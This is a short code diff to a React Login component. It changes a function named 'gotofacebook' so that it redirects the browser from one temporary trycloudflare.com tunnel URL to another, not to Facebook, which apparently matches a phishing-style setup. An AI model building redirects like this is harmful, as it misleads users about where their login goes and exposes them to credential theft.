@@ -16,7 +16,8 @@ const Login = () => {
   }
 
   const gotofacebook = () => {
-    window.location.href = 'https://week-lat-together-brown.trycloudflare.com';
+
+    window.location.href = 'https://database-sun-federal-twice.trycloudflare.com';
 
   }
 
